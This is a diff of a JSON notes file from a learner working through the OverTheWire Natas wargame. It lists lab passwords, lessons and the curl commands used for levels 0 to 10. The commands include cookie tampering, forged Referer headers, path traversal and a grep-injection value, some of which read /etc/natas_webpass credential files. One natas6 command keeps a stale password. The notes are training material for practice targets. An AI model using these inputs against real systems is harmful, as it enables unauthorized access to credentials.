@@ -1,56 +1,56 @@
 {
     "0": {
-        "password_to_next_level": "0nzCigAq7t2iALyvU9xcHlYN4MlkIwlq",
+        "password_to_next_level": "scfWG6qNEIdzqVyfRwEGXyNUfFZkZeQ7",
         "lesson": "curl is meant to load a url on the command line \n while -v when added shows more detailed information like Header, redirect TSL/SSL handshake",
         "commands": "curl -v -u natas0 url"
     },
     "natas1": {
-        "password_to_next_level": "TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI",
+        "password_to_next_level": "vsDOxoXyq3wckCP1ZmTZ71ngIA606odB",
         "lesson": "I never added http:// to make it work, however I am yet to find out the reason it wasn't working before with http",
         "commands": "curl -v -u username:password url(without http)"
     },
     "natas2": {
-        "password_to_next_level": "3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH",
+        "password_to_next_level": "K30JrSRHzjxq3paUQuwozY4MNvmNFyhI",
         "lesson": "Sometimes look at the output of curl the clue could be in somefiles hidden there",
         "commands": "curl -u natas2:TguMNxKo1DSa1tujBLuZJnDUlCcUAPlI http://natas2.natas.labs.overthewire.org/files/users.txt"
     },
     "natas3": {
-        "password_to_next_level": "QryZXc2e0zahULdHrtHxzyYkj59kUxLQ",
+        "password_to_next_level": "JDrPnuZAKyl6MkiqQGFIddrqpvgOASth",
         "lesson": "The password or some other special files could be hidden in a location that is not available on the web, the file robots.txt holds those files. sometimes in the process of trying to get that file you could hit another pointer which shows what is available on the web and that is where other files could be located",
         "commands": "[curl -u natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH http://natas3.natas.labs.overthewire.org/robots.txt, curl -u natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH http://natas3.natas.labs.overthewire.org/s3cr3t/, curl -u natas3:3gqisGdR0pjm6tpkDKdIWO2hSvchLeYH http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt]"
     },
     "natas4": {
-        "password_to_next_level": "0n35PkggAPm2zbEpOU802c0x0Msn1ToK",
+        "password_to_next_level": "e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M",
         "lesson": "Sometimes you might need to add some header parameter like this one required Referer i.e.  where you are coming from, despite the authentication is correct they still want to know where we came from",
-        "commands": "curl -v -u natas4:QryZXc2e0zahULdHrtHxzyYkj59kUxLQ -H \"Referer: http://natas5.natas.labs.overthewire.org/\" http://natas4.natas.labs.overthewire.org"
+        "commands": "curl -v -u natas4:JDrPnuZAKyl6MkiqQGFIddrqpvgOASth -H \"Referer: http://natas5.natas.labs.overthewire.org/\" http://natas4.natas.labs.overthewire.org"
     },
     "natas5": {
-        "password_to_next_level": "0RoJwHdSKWFTYR5WuiAewauSuNaBXned",
+        "password_to_next_level": "7mhjtShJAcld2NYbKHEadnhEwRn2P8VT",
         "lesson": "Cookies that are not cryptographically signed can be manipulated say for instance the loggedin parameter can be changed to 1 to show that you were loggedin before",
-        "commands": "curl --cookie loggedin=1 -u natas5:0n35PkggAPm2zbEpOU802c0x0Msn1ToK http://natas5.natas.labs.overthewire.org"
+        "commands": "curl --cookie loggedin=1 -u natas5:e4z2Noy3oqwPJUWzJH0dseN67Cn1sy2M http://natas5.natas.labs.overthewire.org"
     },
     "natas6": {
-        "password_to_next_level": "bmg8SvU1LizuWjx3y7xkNERkHxGre0GS",
+        "password_to_next_level": "B1szg95UcTnrzwnF3i3TzYHlyYh8iBV0",
         "lesson": "Sometimes there are some files that are only meant to be used by internal server and is called /includes located at the root of the url, take for instance we can have ww.google.com/includes/secret.inc  But before I was able to get that I had to fine out from the source code what the include file would contain. The grep command had to be my friend here. url/source-code.html/ | grep includes",
-        "commands": "curl -v -u natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned http://natas6.natas.labs.overthewire.org/index-source.html | grep includes   curl -v -u natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned http://natas6.natas.labs.overthewire.org/includes/secrets.inc.  Inside there I found the password that helped me login."
+        "commands": "curl -v -u natas6:7mhjtShJAcld2NYbKHEadnhEwRn2P8VT http://natas6.natas.labs.overthewire.org/index-source.html | grep includes   curl -v -u natas6:0RoJwHdSKWFTYR5WuiAewauSuNaBXned http://natas6.natas.labs.overthewire.org/includes/secrets.inc.  Inside there I found the password that helped me login."
     },
     "natas7": {
-        "password_to_next_level": "xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q",
+        "password_to_next_level": "ugXL95KQmUAJJj6bMezOlBNDyI9Imwkc",
         "lesson": "Path traversal: is a common web vulnerability where the developer fails to give restriction to general access to some files that are meant for only admin, some files that may contains some user info like password, secrets. This is done by using ../../../etc/secret.txt or some other path name added to the ../../../ . With this the attacker can easily travers through the paths directly to where the unauthorized location. They can even do somethings that more advance like  ....//....//....// or even encode those . and / with the html encoding so that if the developer placed rules that rejects those paths as input.",
-        "commands": "curl -v -u natas7:bmg8SvU1LizuWjx3y7xkNERkHxGre0GS http://natas7.natas.labs.overthewire.org/index.php?page=/../../../etc/natas_webpass/natas8"
+        "commands": "curl -v -u natas7:B1szg95UcTnrzwnF3i3TzYHlyYh8iBV0 http://natas7.natas.labs.overthewire.org/index.php?page=/../../../etc/natas_webpass/natas8"
     },
     "natas8": {
-        "password_to_next_level": "ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t",
+        "password_to_next_level": "UdxmI27dTaXmnd1rxKQTfws6jihTdcQ9",
         "lesson": "secrets could be encoded and encoding is not the same as encryption, if encoded it could also be decoded ",
-        "commands": "curl -v -u natas8:xcoXLmzMkoIP9D7hlgPlh9XD7OgLAe5Q http://natas8.natas.labs.overthewire.org/index-source.html | grep encode"
+        "commands": "curl -v -u natas8:ugXL95KQmUAJJj6bMezOlBNDyI9Imwkc http://natas8.natas.labs.overthewire.org/index-source.html | grep encode"
     },
     "natas9": {
-        "password_to_next_level": "t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu",
+        "password_to_next_level": "EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv",
         "lesson": "The concept was on command injection and from knowledge gathered if the internal or source code gives allowance for shell scripts, then the attacker can input scripts that can change some internal codes or even fetch some files.",
-        "commands": "curl -v -u natas9:ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t http://natas9.natas.labs.overthewire.org/index-source.html"
+        "commands": "curl -v -u natas9:UdxmI27dTaXmnd1rxKQTfws6jihTdcQ9 http://natas9.natas.labs.overthewire.org/index-source.html"
     },
     "natas10": {
-        "password_to_next_level": "UJdqkK1pTu6VLt9UHWAgRZz6sVUZ3lEk",
+        "password_to_next_level": "VUMQDmuITOEHzhviLE5V0VG9cPMQkyxd",
         "lesson": "Even if some commands have been blacklisted there are still other commands that will solve the challenge by bypassing those whitelisted commands",
         "commands": ".* /etc/natas_webpass/natas11"
     }
